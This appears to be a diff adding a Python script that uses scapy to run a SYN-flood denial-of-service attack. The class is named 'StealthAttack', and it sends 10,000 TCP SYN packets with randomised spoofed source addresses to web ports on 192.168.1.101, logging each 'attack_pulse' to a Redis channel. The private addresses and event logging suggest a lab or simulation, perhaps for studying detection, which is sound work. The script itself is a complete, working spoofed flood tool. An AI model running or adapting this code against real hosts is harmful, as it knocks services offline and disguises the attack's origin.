@@ -1,0 +1,29 @@
+from scapy.all import *
+import random
+import json
+import redis
+
+r = redis.Redis(host='192.168.1.102', port=6379)
+
+class StealthAttack:
+    def __init__(self):
+        self.target = '192.168.1.101'
+        self.ports = [80, 443, 8080]
+    
+    def polymorphic_flood(self):
+        for _ in range(10000):
+            src_ip = f"10.0.2.{random.randint(1, 254)}"
+            sport = random.randint(1024, 65535)
+            dport = random.choice(self.ports)
+            packet = IP(src=src_ip, dst=self.target)/TCP(sport=sport, dport=dport, flags="S")
+            send(packet, verbose=0)
+            r.publish('network_events', json.dumps({
+                'type': 'attack_pulse',
+                'source': 104,
+                'target': 101,
+                'intensity': 0.95
+            }))
+
+if __name__ == '__main__':
+    attack = StealthAttack()
+    attack.polymorphic_flood()
